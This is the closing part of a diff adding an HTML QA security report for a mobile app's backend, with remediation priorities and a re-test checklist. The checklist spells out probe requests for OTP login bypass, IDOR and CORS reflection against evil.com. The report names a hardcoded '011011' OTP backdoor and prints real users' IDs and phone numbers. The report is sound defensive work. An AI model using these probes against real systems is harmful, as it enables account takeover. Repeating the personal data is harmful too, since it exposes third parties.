+    <tr><td>TC-42</td><td><code>/register</code> rejects duplicate mobile number</td></tr>
+    <tr><td>TC-46</td><td><code>GET /login</code> returns 405 Method Not Allowed</td></tr>
+    <tr><td>TC-52</td><td><code>/delete_users</code> correctly refuses cross-user deletion</td></tr>
+  </tbody>
+</table>
+
+<!-- ================= RECOMMENDATIONS ================= -->
+<h2>10. Recommendations &amp; Priority</h2>
+
+<div class="callout red">
+  <b>Immediate action (blocking release):</b> Escalate BUG-001, BUG-002, BUG-003 and BUG-004 to the backend team. These cannot be fixed from the Android codebase. Target a patch release once backend delivers.
+</div>
+
+<h3>Priority order for the backend team</h3>
+<ol class="clean">
+  <li><b>BUG-001</b> — Move OTP generation and validation to the server. Remove client-supplied <code>otp</code> field. (Also closes BUG-006.)</li>
+  <li><b>BUG-002</b> — Resolve <code>user_id</code> from JWT <code>sub</code> claim, not from request body. Audit every endpoint taking <code>user_id</code>.</li>
+  <li><b>BUG-003</b> — Lock down CORS: allowed-origins whitelist, no credentials reflection.</li>
+  <li><b>BUG-004</b> — Add <code>throttle</code> middleware: per-mobile + per-IP rate limits on <code>/send_otp</code> and <code>/login</code>.</li>
+  <li><b>BUG-005 / 010</b> — Add <code>FormRequest</code> validators and proper HTTP status codes on all auth endpoints.</li>
+  <li><b>BUG-007</b> — <code>/register</code> must require a server-issued OTP proof token.</li>
+  <li><b>BUG-008</b> — Short-lived JWT + refresh token + real <code>/logout</code>.</li>
+  <li>BUG-009, 011, 012, 013 — validation clean-up.</li>
+</ol>
+
+<h3>Android-side work (what I can deliver)</h3>
+<ul class="clean">
+  <li><b>BUG-015</b> — Already fixed and verified. Recommend enabling <code>isMinifyEnabled = true</code> on release as a follow-up.</li>
+  <li><b>BUG-014</b> — Move Cashfree keys to <code>BuildConfig</code> (awaiting key rotation by the payments / ops team).</li>
+  <li><b>BUG-001 (partial)</b> — Remove <code>"011011"</code> backdoor and stop generating OTP locally. Ship alongside the backend fix.</li>
+  <li><b>BUG-006 (partial)</b> — Drop <code>otp</code> field from <code>send_otp</code> Retrofit call after server accepts new payload.</li>
+  <li><b>BUG-013 (partial)</b> — Add <code>InputFilter</code> length caps on signup fields.</li>
+  <li><b>BUG-016 (partial)</b> — Map cryptic error message to friendly UI string.</li>
+  <li><b>Additional hardening</b> — certificate pinning on OkHttp, store JWT in EncryptedSharedPreferences, disable <code>allowBackup</code>.</li>
+</ul>
+
+<!-- ================= RE-TEST CHECKLIST ================= -->
+<h2>11. Re-test Checklist (once backend delivers fixes)</h2>
+<ol class="clean">
+  <li><b>BUG-001:</b> <code>POST /login mobile=X&amp;code=0&amp;code_verifier=0</code> with no prior <code>/send_otp</code> should return 401 / 422.</li>
+  <li><b>BUG-001:</b> <code>/login</code> with an incorrect OTP should return an error and increment the attempt counter.</li>
+  <li><b>BUG-002:</b> As user A, call <code>/userdetails user_id=B</code> should return 403, or own-user data ignoring the body.</li>
+  <li><b>BUG-003:</b> <code>OPTIONS /login Origin: https://evil.com</code> should not reflect that origin in the response headers.</li>
+  <li><b>BUG-004:</b> Burst 10 × <code>/send_otp</code> in 10 seconds should return 429 after the threshold.</li>
+  <li><b>BUG-005:</b> <code>/send_otp</code> with missing fields should return 400 JSON, not 500 HTML.</li>
+  <li><b>BUG-008:</b> Call <code>/logout</code> then reuse the token should return 401.</li>
+  <li><b>BUG-014:</b> Decompile release APK — no Cashfree secret strings should appear.</li>
+  <li><b>BUG-015:</b> <code>adb logcat</code> during login on a release build — no OTP or URL logs should appear.</li>
+  <li><b>Regression:</b> Full signup + login + profile fetch must still work end-to-end.</li>
+</ol>
+
+<div class="callout blue">
+  <b>Test data to clean up:</b> Please purge the following test users I created during testing from the demohima database: ID 456976 (mobile 9876543210), ID 456978 (mobile 9000000003). During the IDOR probe I also incidentally read data for real users 456974 (6162326296) and 456975 (8464643464) — no data was exfiltrated beyond what&rsquo;s quoted in this report.
+</div>
+
+<div class="footer-note">
+  Report prepared by Perumal (QA) · perumal@innovfix.in · 21 April 2026<br>
+  Full raw test transcripts and interactive HTML version are archived in the <code>QA_Reports/</code> folder of the repository.
+</div>
+
+</body>
+</html>
